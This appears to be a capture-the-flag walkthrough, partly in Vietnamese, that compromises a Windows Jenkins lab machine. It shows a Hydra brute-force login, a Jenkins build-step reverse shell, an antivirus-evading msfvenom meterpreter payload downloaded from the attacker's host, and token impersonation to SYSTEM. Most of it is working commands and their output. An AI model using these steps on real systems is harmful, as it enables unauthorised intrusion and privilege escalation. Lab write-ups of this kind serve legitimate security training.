┌──(kali㉿kali)-[~] <br>
└─$ nmap -sV -Pn 10.49.190.181   

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-11 23:39 EDT
Nmap scan report for 10.49.190.181
Host is up (0.13s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1324.49 seconds
```

<img width="1502" height="620" alt="image" src="https://github.com/user-attachments/assets/61221b75-f31f-48a8-a49b-92ddc2db326a" />

<img width="697" height="418" alt="image" src="https://github.com/user-attachments/assets/9be0cc68-39c3-45b9-a885-99cd787a9c07" />

┌──(kali㉿kali)-[~] <br>
└─$ hydra -L /usr/share/wordlists/fasttrack.txt -P /usr/share/wordlists/fasttrack.txt -s 8080 -t 4 -f 10.48.178.41 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" -f -V

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-12 05:47:02
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore

[DATA] max 4 tasks per 1 server, overall 4 tasks, 68644 login tries (l:262/p:262), ~17161 tries per task
[DATA] attacking http-post-form://10.48.178.41:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password
[ATTEMPT] target 10.48.178.41 - login "admin" - pass "admin" - 1 of 68644 [child 0] (0/0)
[ATTEMPT] target 10.48.178.41 - login "admin" - pass "Spring2017" - 2 of 68644 [child 1] (0/0)
[ATTEMPT] target 10.48.178.41 - login "admin" - pass "Spring2021" - 3 of 68644 [child 2] (0/0)
[ATTEMPT] target 10.48.178.41 - login "admin" - pass "spring2021" - 4 of 68644 [child 3] (0/0)
[ATTEMPT] target 10.48.178.41 - login "admin" - pass "Summer2021" - 5 of 68644 [child 1] (0/0)
[ATTEMPT] target 10.48.178.41 - login "admin" - pass "summer2021" - 6 of 68644 [child 3] (0/0)
[ATTEMPT] target 10.48.178.41 - login "admin" - pass "Autumn2021" - 7 of 68644 [child 2] (0/0)
[8080][http-post-form] host: 10.48.178.41   login: admin   password: admin 
[STATUS] attack finished for 10.48.178.41 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-12 05:47:15
```

Download file 
<a href="Invoke-PowerShellTcp.ps1">
  <kbd>File Invoke-PowerShellTcp.ps1 </kbd>
</a>

<img width="946" height="182" alt="image" src="https://github.com/user-attachments/assets/0bbac368-c6db-4036-a933-75dfb4422db9" /> <br>

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/97a87c0e-43e5-472e-b3d7-27327386c5e7" /> <br>

<img width="1918" height="837" alt="image" src="https://github.com/user-attachments/assets/e7b77c0e-2ad8-492a-ad60-f5df9669e0ed" /> <br>

<img width="1918" height="300" alt="image" src="https://github.com/user-attachments/assets/0838c3a7-0bff-4536-821f-657facf5630c" />

<img width="1907" height="790" alt="image" src="https://github.com/user-attachments/assets/b992850e-a9bd-49d7-80b2-c084c703cd2c" /> <br>
 Bấm save và "Build now"

<img width="1917" height="652" alt="image" src="https://github.com/user-attachments/assets/63187a42-1f6d-4197-a2cc-17a9575f580b" />

PS C:\Program Files (x86)\Jenkins\workspace\project> cd C:\  <br>
PS C:\> dir

```
    Directory: C:\


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/25/2019  10:21 PM            inetpub                           
d----         7/14/2009   4:20 AM            PerfLogs                          
d-r--        10/27/2019  12:12 AM            Program Files                     
d-r--        10/25/2019   9:54 PM            Program Files (x86)               
d-r--        10/26/2019   9:22 PM            Users                             
d----        10/27/2019  12:25 AM            Windows                           
```

PS C:\> cd Users <br>
PS C:\Users> dir

```
    Directory: C:\Users


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/25/2019   8:05 PM            bruce                             
d----        10/25/2019  10:21 PM            DefaultAppPool                    
d-r--        11/21/2010   7:16 AM            Public                                               
```

PS C:\Users> cd bruce <br>
PS C:\Users\bruce> dir

```
    Directory: C:\Users\bruce


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/25/2019   8:05 PM            .groovy                           
d-r--        10/25/2019   9:51 PM            Contacts                          
d-r--        10/25/2019  11:22 PM            Desktop                           
d-r--        10/26/2019   4:43 PM            Documents                         
d-r--        10/26/2019   4:43 PM            Downloads                         
d-r--        10/25/2019   9:51 PM            Favorites                         
d-r--        10/25/2019   9:51 PM            Links                             
d-r--        10/25/2019   9:51 PM            Music                             
d-r--        10/25/2019  10:26 PM            Pictures                          
d-r--        10/25/2019   9:51 PM            Saved Games                       
d-r--        10/25/2019   9:51 PM            Searches                          
d-r--        10/25/2019   9:51 PM            Videos                            
```

PS C:\Users\bruce> cd Desktop <br>      
PS C:\Users\bruce\Desktop> dir

```
    Directory: C:\Users\bruce\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        10/25/2019  11:22 PM         32 user.txt                          
```

PS C:\Users\bruce\Desktop> more user.txt

```
79007a09481963edf2e1321abd9ae2a0
```

Sử dụng msfvenom để tạo Windows <br>

Tấn công đảo ngược shell sử dụng payload sau: <br>

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe`

Tải trọng này tạo ra một gói TCP ngược x86-64 được mã hóa.<br>
Tải trọng (payload). Tải trọng thường được mã hóa để đảm bảo chúng được truyền tải chính xác và cũng để tránh bị các phần mềm chống virus phát hiện. Phần mềm chống virus có thể không nhận ra tải trọng và sẽ không gắn cờ nó là độc hại. <br>

┌──(kali㉿kali)-[~] <br>
└─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=192.168.175.163 LPORT=1234 -f exe -o shell-name.exe

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: shell-name.exe

```

PS C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://192.168.175.163:80/shell-name.exe','shell-name.exe')" <br>
PS C:\Users\bruce\Desktop> PS C:\Users\bruce\Desktop> dir 

```
    Directory: C:\Users\bruce\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         7/12/2026  12:17 PM      73802 shell-name.exe                    
-a---        10/25/2019  11:22 PM         32 user.txt
```

┌──(kali㉿kali)-[~] <br>
└─$ msfconsole

```
Metasploit tip: Use sessions -1 to interact with the last opened session
                                                  
Call trans opt: received. 2-19-98 13:24:18 REC:Loc
                                                                            
     Trace program: running                                                 
                                                                            
           wake up, Neo...                                                  
        the matrix has you                                                  
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
                 ; ,''-,;' ``-
                  ``-..__``--`

                             https://metasploit.com


       =[ metasploit v6.4.84-dev                                ]
+ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project
```

msf > use exploit/multi/handler

```
[*] Using configured payload generic/shell_reverse_tcp
```

msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp <br>
msf exploit(multi/handler) > set lhost 192.168.175.163 <br>
msf exploit(multi/handler) > set lport 1234 <br>
msf exploit(multi/handler) > run <br>

PS C:\Users\bruce\Desktop> Start-Process "shell-name.exe"
<img width="935" height="127" alt="image" src="https://github.com/user-attachments/assets/11993ad6-393a-467d-ba59-cc77d7afd2bf" />

Nhập: `load incognito` để tải mô-đun ẩn danh trong Metasploit. Xin lưu ý rằng bạn có thể cần sử dụng lệnh `use incognito` nếu lệnh trước đó không hoạt động. <br>

meterpreter > use incognito
```
Loading extension incognito...Success.
```

Để kiểm tra xem có token nào khả dụng hay không, hãy nhập lệnh list_tokens -g . Ta có thể thấy rằng token BUILTIN\Administrators đang khả dụng. 

meterpreter >  list_tokens -g

```
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT SERVICE\AudioEndpointBuilder
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\PcaSvc
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
No tokens available

```
Sử dụng lệnh impersonate_token "BUILTIN\Administrators" để mạo danh token của Administrators

meterpreter > impersonate_token "BUILTIN\Administrators"

```
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

meterpreter > getuid

```
Server username: NT AUTHORITY\SYSTEM
```

Mặc dù bạn có mã thông báo có đặc quyền cao hơn, nhưng bạn có thể không có quyền của người dùng có đặc quyền (điều này là do cách Windows xử lý quyền - nó sử dụng Mã thông báo chính của tiến trình chứ không phải mã thông báo được mạo danh để xác định những gì tiến trình có thể hoặc không thể làm). <br>

Hãy đảm bảo bạn chuyển sang tiến trình có quyền truy cập chính xác (câu trả lời cho câu hỏi trên). Tiến trình an toàn nhất để chọn là tiến trình services.exe. Trước tiên, hãy sử dụng lệnh ps để xem các tiến trình và tìm PID của tiến trình services.exe. <br>

meterpreter > ps

```
Process List
============

 PID   PPID  Name        Arch  Session  User              Path
 ---   ----  ----        ----  -------  ----              ----
 0     0     [System Pr
             ocess]
 4     0     System      x64   0
 396   4     smss.exe    x64   0        NT AUTHORITY\SYS  C:\Windows\Syste
                                        TEM               m32\smss.exe
 524   516   csrss.exe   x64   0        NT AUTHORITY\SYS  C:\Windows\Syste
                                        TEM               m32\csrss.exe
 572   564   csrss.exe   x64   1        NT AUTHORITY\SYS  C:\Windows\Syste
                                        TEM               m32\csrss.exe
 580   516   wininit.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\Syste
             e                          TEM               m32\wininit.exe
 608   564   winlogon.e  x64   1        NT AUTHORITY\SYS  C:\Windows\Syste
             xe                         TEM               m32\winlogon.exe
 668   580   services.e  x64   0        NT AUTHORITY\SYS  C:\Windows\Syste
             xe                         TEM               m32\services.exe
 676   580   lsass.exe   x64   0        NT AUTHORITY\SYS  C:\Windows\Syste
                                        TEM               m32\lsass.exe
 684   580   lsm.exe     x64   0        NT AUTHORITY\SYS  C:\Windows\Syste
                                        TEM               m32\lsm.exe
 720   668   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\Syste
             e                          TEM               m32\svchost.exe
 772   668   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\Syste
             e                          TEM               m32\svchost.exe
 848   668   svchost.ex  x64   0        NT AUTHORITY\NET  C:\Windows\Syste
             e                          WORK SERVICE      m32\svchost.exe
 920   608   LogonUI.ex  x64   1        NT AUTHORITY\SYS  C:\Windows\Syste
             e                          TEM               m32\LogonUI.exe
 928   524   conhost.ex  x64   0        alfred\bruce      C:\Windows\Syste
             e                                            m32\conhost.exe
 936   668   svchost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\Syste
             e                          AL SERVICE        m32\svchost.exe
 992   668   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\Syste
             e                          TEM               m32\svchost.exe
 1012  668   svchost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\Syste
             e                          AL SERVICE        m32\svchost.exe
 1016  668   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\Syste
             e                          TEM               m32\svchost.exe
 1072  668   svchost.ex  x64   0        NT AUTHORITY\NET  C:\Windows\Syste
             e                          WORK SERVICE      m32\svchost.exe
 1212  668   spoolsv.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\Syste
             e                          TEM               m32\spoolsv.exe
 1244  668   svchost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\Syste
             e                          AL SERVICE        m32\svchost.exe
 1340  668   amazon-ssm  x64   0        NT AUTHORITY\SYS  C:\Program Files
             -agent.exe                 TEM               \Amazon\SSM\amaz
                                                          on-ssm-agent.exe
 1412  668   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\Syste
             e                          TEM               m32\svchost.exe
 1436  668   LiteAgent.  x64   0        NT AUTHORITY\SYS  C:\Program Files
             exe                        TEM               \Amazon\Xentools
                                                          \LiteAgent.exe
 1464  668   svchost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\Syste
             e                          AL SERVICE        m32\svchost.exe
 1604  668   jenkins.ex  x64   0        alfred\bruce      C:\Program Files
             e                                             (x86)\Jenkins\j
                                                          enkins.exe
 1680  668   SearchInde  x64   0        NT AUTHORITY\SYS  C:\Windows\Syste
             xer.exe                    TEM               m32\SearchIndexe
                                                          r.exe
 1716  668   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\Syste
             e                          TEM               m32\svchost.exe
 1724  1792  cmd.exe     x86   0        alfred\bruce      C:\Windows\SysWO
                                                          W64\cmd.exe
 1792  1604  java.exe    x86   0        alfred\bruce      C:\Program Files
                                                           (x86)\Jenkins\j
                                                          re\bin\java.exe
 1840  668   Ec2Config.  x64   0        NT AUTHORITY\SYS  C:\Program Files
             exe                        TEM               \Amazon\Ec2Confi
                                                          gService\Ec2Conf
                                                          ig.exe
 1952  524   conhost.ex  x64   0        alfred\bruce      C:\Windows\Syste
             e                                            m32\conhost.exe
 2112  772   WmiPrvSE.e  x64   0        NT AUTHORITY\NET  C:\Windows\Syste
             xe                         WORK SERVICE      m32\wbem\WmiPrvS
                                                          E.exe
 2508  1724  powershell  x86   0        alfred\bruce      C:\Windows\SysWO
             .exe                                         W64\WindowsPower
                                                          Shell\v1.0\power
                                                          shell.exe
 2576  668   sppsvc.exe  x64   0        NT AUTHORITY\NET  C:\Windows\Syste
                                        WORK SERVICE      m32\sppsvc.exe
 2612  668   TrustedIns  x64   0        NT AUTHORITY\SYS  C:\Windows\servi
             taller.exe                 TEM               cing\TrustedInst
                                                          aller.exe
 2624  2508  shell-name  x86   0        alfred\bruce      C:\Users\bruce\D
             .exe                                         esktop\shell-nam
                                                          e.exe
 2716  668   svchost.ex  x64   0        NT AUTHORITY\NET  C:\Windows\Syste
             e                          WORK SERVICE      m32\svchost.exe
```

Chuyển sang tiến trình này bằng lệnh migrate PID-CỦA-TIẾN TRÌNH.  <br>

meterpreter > migrate 668

```
[*] Migrating from 580 to 668...
[*] Migration completed successfully.
```
meterpreter > pwd

```
C:\Windows\system32
```
meterpreter > cd config
meterpreter > ls

<img width="843" height="113" alt="image" src="https://github.com/user-attachments/assets/55229a7b-3918-4587-921c-2f966e6edab1" />

meterpreter > cat root.txt
```
��dff0f748678f280250f25a45b8046b4a
```




